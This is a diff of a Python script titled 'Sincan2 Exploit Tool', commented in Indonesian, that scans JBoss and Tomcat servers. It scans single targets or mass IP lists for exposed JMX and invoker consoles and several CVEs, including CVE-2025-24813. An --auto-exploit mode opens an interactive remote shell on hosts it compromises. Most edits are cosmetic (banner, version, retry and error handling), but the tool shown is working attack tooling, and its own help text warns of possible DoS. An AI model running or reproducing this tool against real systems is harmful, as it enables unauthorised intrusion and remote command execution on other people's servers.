@@ -11,7 +11,7 @@ import datetime
 import signal
 import _exploits
 import _updates
-from os import name, system, path as os_path, get_terminal_size
+from os import name, system, path as os_path
 import os, sys
 from time import sleep
 from random import randint
@@ -25,19 +25,19 @@ try:
     import requests
     requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 except ImportError:
-    pass 
+    pass
 
 try:
     from urllib3.exceptions import InsecureRequestWarning
     warnings.filterwarnings("ignore", category=InsecureRequestWarning)
 except ImportError:
-    pass 
+    pass
 
 # Menonaktifkan pembuatan file log
 logging.captureWarnings(True)
 
-__author__ = "João Filho Matos Figueiredo (Original), Sincan2 (Refactoring)"
-__version__ = "3.5.0 (Fast Ducks Banner)"
+__author__ = "MHL TEAM (Original), Sincan2 (Refactoring)"
+__version__ = "3.7.2 (Sincan2)"
 
 # Definisi warna
 RED = '\x1b[91m'
@@ -81,15 +81,17 @@ def get_random_user_agent():
     ]
     return user_agents[randint(0, len(user_agents) - 1)]
 
+# Menonaktifkan mekanisme retry untuk mencegah "hang"
 def configure_http_pool():
     """Mengonfigurasi koneksi HTTP Pool berdasarkan argumen."""
     global gl_http_pool
     timeout = Timeout(connect=gl_args.timeout, read=gl_args.timeout * 2)
+    # Menambahkan retries=False untuk mencegah coba lagi pada koneksi yang gagal
     if gl_args.proxy:
-        gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE')
+        gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE', retries=False)
     else:
-        gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
-    
+        gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE', retries=False)
+
     warnings.filterwarnings("ignore", category=InsecureRequestWarning)
 
 
@@ -133,7 +135,7 @@ def shell_loop(base_url):
     """Memulai loop shell interaktif."""
     print_shell_banner(base_url)
     session = requests.Session()
-    session.verify = False 
+    session.verify = False
     while True:
         try:
             command = input(f"{BOLD}{BLUE}Sincan2 > {ENDC}")
@@ -164,7 +166,7 @@ def check_vul(url):
     if not parsed_main_url.scheme:
         url = "http://" + url
         parsed_main_url = urlparse(url)
-        
+
     print_and_flush(GREEN + f"\n ** Memeriksa Host: {url} **\n" + ENDC)
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive", "User-Agent": get_random_user_agent()}
     paths = {"sincan2-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo", "web-console": "/web-console/ServerInfo.jsp", "Sincan2InvokerServlet": "/invoker/JMXInvokerServlet"}
@@ -186,7 +188,7 @@ def check_vul(url):
                 elif "CVE-2023-1973" in vector: res = _exploits.post_large_form(url, headers)
                 elif "CVE-2023-6236" in vector: res = _exploits.send_spoofed_data(url, headers)
                 elif "CVE-2025-24813" in vector: res = _exploits.exploit_tomcat_cve_2025_24813(url, headers)
-                
+
                 if res['status'] == 'vulnerable':
                     print_and_flush(RED + f"  [ RENTAN ]" + ENDC)
                     if "CVE-2025-24813" in vector:
@@ -204,7 +206,10 @@ def check_vul(url):
                 else:
                     print_and_flush(GREEN + "  [ OK ]" + ENDC); results[vector] = 404
         except Exception as e:
-            print_and_flush(RED + f"\n [ * ] Terjadi error saat memeriksa {vector}: {e}\n" + ENDC); results[vector] = 505
+            # Mengubah pesan error agar lebih ringkas
+            error_type = type(e).__name__
+            print_and_flush(f"{RED} [ TIMEOUT / ERROR: {error_type} ]{ENDC}")
+            results[vector] = 505
     return results
 
 def auto_exploit(url, vector):
@@ -230,69 +235,43 @@ def auto_exploit(url, vector):
         print_and_flush(RED + " [ FAILED ] Gagal mengeksploitasi via vektor ini."+ ENDC)
         return False
 
-# PERUBAHAN: Animasi banner dipercepat dan dibuat menjadi dua bebek
 def banner():
-    """Menampilkan banner animasi beberapa bebek."""
-    duck_frame_1 = ["   __", "  (o.o)>", "  \\ <_ ", " ~~~\\`"]
-    duck_frame_2 = ["   __", "  (o.o)>", "  / _/ ", " ~~~\\`"]
-    
-    try:
-        width = get_terminal_size().columns
-    except OSError:
-        width = 80 
-    
-    # Animasi berjalan selama ~2 detik (40 frame * 0.05 detik)
-    for step in range(40):
-        system('cls' if name == 'nt' else 'clear')
-        
-        # Bebek 1
-        pos1 = step
-        frame1 = duck_frame_1 if step % 2 == 0 else duck_frame_2
-        # Hanya tampilkan jika masih di dalam layar
-        if pos1 < width - 10:
-            for line in frame1:
-                print(" " * pos1 + line)
-        
-        print() # Spacer antar bebek
-
-        # Bebek 2 (mengikuti di belakang)
-        pos2 = step - 10 
-        if pos2 >= 0 and pos2 < width - 10:
-            frame2 = duck_frame_1 if (step + 1) % 2 == 0 else duck_frame_2
-            for line in frame2:
-                print(" " * pos2 + line)
-
-        sleep(0.05) 
-
+    """Menampilkan banner statis."""
     system('cls' if name == 'nt' else 'clear')
-    title = f"{RED1} * --- Sincan2 Exploit Tool v{__version__} by MHL TEAM --- *{ENDC}"
-    # Perbaikan dari error sebelumnya
-    clean_title_len = len(f" * --- Sincan2 Exploit Tool v{__version__} by MHL TEAM --- *")
-    print_and_flush(title.center(width))
-    print_and_flush(("-".center(clean_title_len, "-")).center(width))
+    banner_text = f"""
+{RED1}
+|  \\     /  \\|  \\  |  \\|  \\            |        \\|        \\ /      \\ |  \\     /  \\
+| $$\\   /  $$| $$  | $$| $$             \\$$$$$$$$| $$$$$$$$|  $$$$$$\\| $$\\   /  $$
+| $$$\\ /  $$$| $$__| $$| $$               | $$   | $$__    | $$__| $$| $$$\\ /  $$$
+| $$$$\\  $$$$| $$    $$| $$               | $$   | $$  \\   | $$    $$| $$$$\\  $$$$
+| $$\\$$ $$ $$| $$$$$$$$| $$               | $$   | $$$$$   | $$$$$$$$| $$\\$$ $$ $$
+| $$ \\$$$| $$| $$  | $$| $$_____          | $$   | $$_____ | $$  | $$| $$ \\$$$| $$
+| $$  \\$ | $$| $$  | $$| $$     \\         | $$   | $$     \\| $$  | $$| $$  \\$ | $$
+ \\$$      \\$$ \\$$   \\$$ \\$$$$$$$$          \\$$    \\$$$$$$$$ \\$$   \\$$ \\$$      \\$$
+{YELLOW}
+                  Sincan2 Exploit Tool v{__version__}
+                           - by MHL TEAM -
+{ENDC}
+"""
+    print_and_flush(banner_text)
 
 
 if __name__ == "__main__":
-    try:
-        banner()
-    except Exception:
-        pass
-        
+    # PERUBAHAN: Banner dipanggil secara tidak kondisional di sini
+    banner()
+
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawDescriptionHelpFormatter,
         description=f"Sincan2 v{__version__} - Alat verifikasi dan eksploitasi Sincan2.",
         epilog=textwrap.dedent('''\
         Contoh Penggunaan:
           - Target Tunggal:
-            python %(prog)s -u http://target.com:8080 -M --auto-exploit
+            python3 %(prog)s -u http://target.com:8080 -M --auto-exploit
 
           - Target Massal dari File:
-            python %(prog)s -f list_ip.txt -p 8088 -M --auto-exploit
-
-          - Mengatur Waktu Tunggu (Timeout)
-            python %(prog)s -f list_ip.txt -p 8088 --timeout 3
+            python3 %(prog)s -f list_ip.txt -p 8088 -M --auto-exploit
         '''))
-    
+
     target_group = parser.add_mutually_exclusive_group(required=True)
     target_group.add_argument("-u", "--host", help="Host target tunggal (contoh: http://127.0.0.1:8080)")
     target_group.add_argument("-f", "--file", help="File yang berisi daftar IP/hostname, satu per baris")
@@ -301,9 +280,12 @@ if __name__ == "__main__":
     parser.add_argument("--proxy", help="Gunakan proxy HTTP (contoh: http://127.0.0.1:8080)")
     parser.add_argument("--timeout", type=int, default=5, help="Waktu tunggu koneksi dalam detik (default: 5)")
     parser.add_argument("--auto-exploit", action="store_true", help="Coba eksploitasi otomatis dan buka shell interaktif jika berhasil.")
+    
+    # PERUBAHAN: Argumen --no-banner dihapus
+    
     group_modern = parser.add_argument_group('Opsi Pengecekan Modern')
     group_modern.add_argument("-M", "--scan-modern-vulns", action='store_true', help="Jalankan modul pengecekan modern (CVE 2022-2025). PERINGATAN: Berpotensi DoS.")
-    
+
     gl_args = parser.parse_args()
 
     if gl_args.file and not gl_args.port:
@@ -312,7 +294,7 @@ if __name__ == "__main__":
     targets_to_scan = []
     if gl_args.host:
         targets_to_scan.append(gl_args.host)
-    else: 
+    else:
         if not os_path.exists(gl_args.file):
             print_and_flush(f"{RED}[ERROR] File tidak ditemukan: {gl_args.file}{ENDC}")
             exit(1)
@@ -326,21 +308,22 @@ if __name__ == "__main__":
     _exploits.set_http_pool(gl_http_pool)
     _updates.set_http_pool(gl_http_pool)
 
+    # PERUBAHAN: Pesan info digeser setelah pemanggilan banner
     print_and_flush(f"\n{BLUE}[INFO] Akan memindai {len(targets_to_scan)} target dengan timeout {gl_args.timeout} detik...{ENDC}")
 
     for target_url in targets_to_scan:
         if gl_interrupted:
             print_and_flush(f"{RED}[INFO] Pemindaian massal dihentikan.{ENDC}")
             break
-            
+
         scan_results = check_vul(target_url)
         vulnerables = [k for k, v in scan_results.items() if v == 200]
-        
+
         if not vulnerables:
             print_and_flush(GREEN + f"[+] Selesai untuk {target_url}. Tidak ada kerentanan yang jelas ditemukan." + ENDC)
         else:
             print_and_flush(RED + f"\n[!] Ditemukan potensi kerentanan pada {target_url}: {', '.join(vulnerables)}" + ENDC)
-            
+
             if gl_args.auto_exploit:
                 exploited = False
                 for vector in vulnerables:
